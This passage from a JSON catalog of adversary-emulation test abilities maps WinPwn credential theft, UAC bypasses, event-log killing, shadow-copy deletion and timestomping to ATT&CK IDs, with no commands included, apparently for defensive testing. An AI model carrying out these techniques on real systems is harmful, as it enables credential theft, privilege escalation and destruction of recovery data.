        "ability_id": "c1392878b0e39a2060e7e1b70e5a580b",
        "technique_id": "T1055.001",
        "repeatable": false
    },
    {
        "description": "Get SYSTEM shell - Pop System Shell using CreateProcess technique via function of WinPwn",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Native API",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "b262964145fa55e27265e7caa89b1169",
        "technique_id": "T1106",
        "repeatable": false
    },
    {
        "description": "Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique via function of WinPwn",
        "buckets": [
            "execution"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Native API",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Get SYSTEM shell - Pop System Shell using NamedPipe Impersonation technique",
        "tactic": "execution",
        "plugin": "atomic",
        "ability_id": "f6d9c3fbee5549837ea37ff933291656",
        "technique_id": "T1106",
        "repeatable": false
    },
    {
        "description": "Get SYSTEM shell - Pop System Shell using Token Manipulation technique via function of WinPwn",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Create Process with Token",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Get SYSTEM shell - Pop System Shell using Token Manipulation technique",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "fdc26580786ac9d3ffc38aea053cbd29",
        "technique_id": "T1134.002",
        "repeatable": false
    },
    {
        "description": "Kerberoasting technique via function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Kerberoasting",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "efdca41c8a098f89f2db9c334627d8ac",
        "technique_id": "T1558.003",
        "repeatable": false
    },
    {
        "description": "Kill the event log services for stealth via function of WinPwn",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Impair Defenses: Disable or Modify Tools",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Kill the event log services for stealth",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "d5bb3cda05ddba230c90c1afb2640379",
        "technique_id": "T1562.001",
        "repeatable": false
    },
    {
        "description": "Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "ac7757ba58f423fa808b4b6f115cc613",
        "technique_id": "T1552.001",
        "repeatable": false
    },
    {
        "description": "Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "f6867f2b9b1b3c2eb733ad7ce7438f04",
        "technique_id": "T1555",
        "repeatable": false
    },
    {
        "description": "Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "OS Credential Dumping: Security Account Manager",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "1ae855684c48448c29ad04858bbe5a2a",
        "technique_id": "T1003.002",
        "repeatable": false
    },
    {
        "description": "Loot local Credentials - Invoke-WCMDump technique via function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Windows Credential Manager",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Loot local Credentials - Invoke-WCMDump",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "1353d954c020fa5ff039b7e85ee261bc",
        "technique_id": "T1555.004",
        "repeatable": false
    },
    {
        "description": "Loot local Credentials - Safetykatz technique via function of WinPwn",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Valid Accounts: Local Accounts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Loot local Credentials - Safetykatz",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "fe3527480a77ab0b52a518654e120b72",
        "technique_id": "T1078.003",
        "repeatable": false
    },
    {
        "description": "Loot local Credentials - Wifi Credentials technique via function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Loot local Credentials - Wifi Credentials",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "c7aa16aea441e7bec9a6391af601acc9",
        "technique_id": "T1555",
        "repeatable": false
    },
    {
        "description": "The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. \nEach software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been developed for the purpose of finding these passwords for the most commonly-used software",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Loot local Credentials - lazagne",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "2c6e39a39ebf794d74417a7b1291463b",
        "technique_id": "T1555",
        "repeatable": false
    },
    {
        "description": "Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Loot local Credentials - mimi-kittenz",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "c6ea575d9641c11410417105f14175ab",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "Loot local Credentials - powerhell kittie technique via function of WinPwn",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Valid Accounts: Local Accounts",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Loot local Credentials - powerhell kittie",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "5ce7136a4547b0bf3ca074c94fb10b24",
        "technique_id": "T1078.003",
        "repeatable": false
    },
    {
        "description": "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Service Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - MS17-10",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "e958169f1efe85a5a5ea7a77eba8c29e",
        "technique_id": "T1046",
        "repeatable": false
    },
    {
        "description": "Gathers local system information using the Morerecon function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Morerecon",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "a9faa0d792d6bc2660b05e7650d2736d",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: AS-REP Roasting",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "52928f462ea8f5fa617aa8c815f5598b",
        "technique_id": "T1558.004",
        "repeatable": false
    },
    {
        "description": "PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Steal or Forge Kerberos Tickets: Kerberoasting",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - PowerSharpPack - Kerberoasting Using Rubeus",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "5e3512c73a461c17ddcb1cc0bbdbeef9",
        "technique_id": "T1558.003",
        "repeatable": false
    },
    {
        "description": "PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS technique via function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Forced Authentication",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - PowerSharpPack - Retrieving NTLM Hashes without Touching LSASS",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "6b8a391237b7169d02dd6538f8290345",
        "technique_id": "T1187",
        "repeatable": false
    },
    {
        "description": "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - PowerSharpPack - Seatbelt",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "b8e136dad1af7b29939e86be6d7ecefa",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "413fc5fa7ac34f8a42183217d7f3ec90",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Credentials from Password Stores: Credentials from Web Browsers",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - PowerSharpPack - Sharpweb for Browser Credentials",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "aee64e494f7adfb1867d67f7ee08e5c6",
        "technique_id": "T1555.003",
        "repeatable": false
    },
    {
        "description": "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - PowerSharpPack - Watson searching for missing windows patches",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "286916316d725933021d57fb5620d644",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Powersploits privesc checks using oldchecks function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Powersploits privesc checks",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "009e7a7118b5a182b2a5b65150e5cc6f",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - RBCD-Check",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "566b2f5743d88edb44ad1d9d450e921c",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Reflectively load Mimik@tz into memory technique via function of WinPwn",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Reflective Code Loading",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Reflectively load Mimik@tz into memory",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "aa758d17faffeeb69c56481340891859",
        "technique_id": "T1620",
        "repeatable": false
    },
    {
        "description": "Launches SessionGopher on this system via WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - SessionGopher",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "6d968b2bfa7f45550662620724618fb9",
        "technique_id": "T1552.001",
        "repeatable": false
    },
    {
        "description": "Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - Snaffler",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "58351281e64f2182ac4f8b44f63e9042",
        "technique_id": "T1552.001",
        "repeatable": false
    },
    {
        "description": "UAC Bypass DccwBypassUAC technique via function of WinPwn",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - UAC Bypass DccwBypassUAC technique",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "b473176c321f31824c909c73807caf92",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "UAC bypass using DiskCleanup technique via function of WinPwn",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - UAC Bypass DiskCleanup technique",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "f27b37f253617c39ac010d2ee1238b7e",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "UAC bypass using ccmstp technique via function of WinPwn",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - UAC Bypass ccmstp technique",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "1bb96a80fd7968839ead470953ffb738",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "UAC bypass using Magic technique via function of WinPwn",
        "buckets": [
            "multiple"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - UAC Magic",
        "tactic": "multiple",
        "plugin": "atomic",
        "ability_id": "824ec334619ca634d13aff308a9a064c",
        "technique_id": "T1548.002",
        "repeatable": false
    },
    {
        "description": "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Service Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - bluekeep",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "9381d0e0efbf5bf89a9e512f8b3745f4",
        "technique_id": "T1046",
        "repeatable": false
    },
    {
        "description": "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Service Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - fruit",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "01f95fd0213aeb1eb07fca8dc548f5ce",
        "technique_id": "T1046",
        "repeatable": false
    },
    {
        "description": "Gathers general domain information using the generaldomaininfo function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Account Discovery: Domain Account",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - generaldomaininfo",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "4bf4facd1dad540d4b17ebe0db235707",
        "technique_id": "T1087.002",
        "repeatable": false
    },
    {
        "description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - itm4nprivesc",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "628181210e822588b5d90e1e256d775a",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "Search for Passwords on this system using passhunt via WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - passhunt",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "9c2f9c808a72b05686236a63e1da93c8",
        "technique_id": "T1552.001",
        "repeatable": false
    },
    {
        "description": "Start PowerUpSQL Checks using powerSQL function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Software Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - powerSQL",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "57548b3eefc3c3d3eaf8c3b51380921a",
        "technique_id": "T1518",
        "repeatable": false
    },
    {
        "description": "Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - powershellsensitive",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "f2d48f9efed23e058bfe0f46d93d07a2",
        "technique_id": "T1552.001",
        "repeatable": false
    },
    {
        "description": "Search for printers / potential vulns using printercheck function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Peripheral Device Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - printercheck",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "941eb886a05444e588fd6c17d992df98",
        "technique_id": "T1120",
        "repeatable": false
    },
    {
        "description": "Search for sensitive files on this local system using the SensitiveFiles function of WinPwn",
        "buckets": [
            "credential-access"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Unsecured Credentials: Credentials In Files",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - sensitivefiles",
        "tactic": "credential-access",
        "plugin": "atomic",
        "ability_id": "2d2b2b31b70f1beef285b942c580f4c3",
        "technique_id": "T1552.001",
        "repeatable": false
    },
    {
        "description": "Network share enumeration using the shareenumeration function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Share Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - shareenumeration",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "d7f1270ba66d5947a1422f7d5b1a36ef",
        "technique_id": "T1135",
        "repeatable": false
    },
    {
        "description": "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Network Service Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - spoolvulnscan",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "bc34d6834bdf568e206627f7809a556f",
        "technique_id": "T1046",
        "repeatable": false
    },
    {
        "description": "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "System Information Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinPwn - winPEAS",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "e6a9fe7e91030f05ad87b75ad4fd4a3a",
        "technique_id": "T1082",
        "repeatable": false
    },
    {
        "description": "An adversary may attempt to use Evil-WinRM with a valid account to interact with remote systems that have WinRM enabled",
        "buckets": [
            "lateral-movement"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Remote Services: Windows Remote Management",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "WinRM Access with Evil-WinRM",
        "tactic": "lateral-movement",
        "plugin": "atomic",
        "ability_id": "55e5a14e5601b7ea81e8bb272b7e03be",
        "technique_id": "T1021.006",
        "repeatable": false
    },
    {
        "description": "This test uses BITSAdmin.exe to schedule a BITS job for the download of a file.\nThis technique is used by Qbot malware to download payloads.\n",
        "buckets": [
            "command-and-control"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Ingress Tool Transfer",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - BITSAdmin BITS Download",
        "tactic": "command-and-control",
        "plugin": "atomic",
        "ability_id": "68f09bfb5a5a28c11608d106eac63abd",
        "technique_id": "T1105",
        "repeatable": false
    },
    {
        "description": "Deletes backup files in a manner similar to Ryuk ransomware. Upon exection, many \"access is denied\" messages will appear as the commands try\nto delete files from around the system.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inhibit System Recovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Delete Backup Files",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "5a9a7d8b4f632652c3ed175c071c5c7a",
        "technique_id": "T1490",
        "repeatable": false
    },
    {
        "description": "Deletes Windows Volume Shadow Copies. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer. Upon\nexecution, if no shadow volumes exist the message \"No items found that satisfy the query.\" will be displayed. If shadow volumes are present, it\nwill delete them without printing output to the screen. This is because the /quiet parameter was passed which also suppresses the y/n\nconfirmation prompt. Shadow copies can only be created on Windows server or Windows 8.\n\nhttps://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc788055(v=ws.11)\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inhibit System Recovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Delete Volume Shadow Copies",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "153905affadb36241ced3d3b12ba0481",
        "technique_id": "T1490",
        "repeatable": false
    },
    {
        "description": "Deletes Windows Volume Shadow Copies via WMI. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nShadow copies can only be created on Windows server or Windows 8.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inhibit System Recovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Delete Volume Shadow Copies via WMI",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "c156ac5c9fa67080365268d95f29053d",
        "technique_id": "T1490",
        "repeatable": false
    },
    {
        "description": "Deletes Windows Volume Shadow Copies with PowerShell code and Get-WMIObject.\nThis technique is used by numerous ransomware families such as Sodinokibi/REvil.\nExecutes Get-WMIObject. Shadow copies can only be created on Windows server or Windows 8, so upon execution\nthere may be no output displayed.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inhibit System Recovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Delete Volume Shadow Copies via WMI with PowerShell",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "e90756bb6dcd21462dc4cc452661df91",
        "technique_id": "T1490",
        "repeatable": false
    },
    {
        "description": "Disables repair by the Windows Recovery Console on boot. This technique is used by numerous ransomware families and APT malware such as Olympic Destroyer.\nUpon execution, \"The operation completed successfully.\" will be displayed in the powershell session.\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inhibit System Recovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Disable Windows Recovery Console Repair",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "8467c994685ccf178db166964bd80fab",
        "technique_id": "T1490",
        "repeatable": false
    },
    {
        "description": "Use schtasks.exe to disable the System Restore (SR) scheduled task\n",
        "buckets": [
            "impact"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Inhibit System Recovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Disable the SR scheduled task",
        "tactic": "impact",
        "plugin": "atomic",
        "ability_id": "2d53d6fabd39bf9c70b0dfcdfbbc926d",
        "technique_id": "T1490",
        "repeatable": false
    },
    {
        "description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Domain Trust Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Discover domain trusts with dsquery",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "f25fb8543b8e49af2aba023985234d1e",
        "technique_id": "T1482",
        "repeatable": false
    },
    {
        "description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n",
        "buckets": [
            "discovery"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Domain Trust Discovery",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Discover domain trusts with nltest",
        "tactic": "discovery",
        "plugin": "atomic",
        "ability_id": "41498c1be5b92133cb9df50bd84211a4",
        "technique_id": "T1482",
        "repeatable": false
    },
    {
        "description": "Modifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Timestomp",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Modify file creation timestamp with PowerShell",
        "tactic": "defense-evasion",
        "plugin": "atomic",
        "ability_id": "5e4bd19a25040d3b9f7ecb61bec62f22",
        "technique_id": "T1070.006",
        "repeatable": false
    },
    {
        "description": "Modifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n",
        "buckets": [
            "defense-evasion"
        ],
        "additional_info": {},
        "privilege": "",
        "technique_name": "Indicator Removal on Host: Timestomp",
        "requirements": [],
        "singleton": false,
        "executors": [],
        "delete_payload": true,
        "access": {},
        "name": "Windows - Modify file last access timestamp with PowerShell",
        "tactic": "defense-evasion",
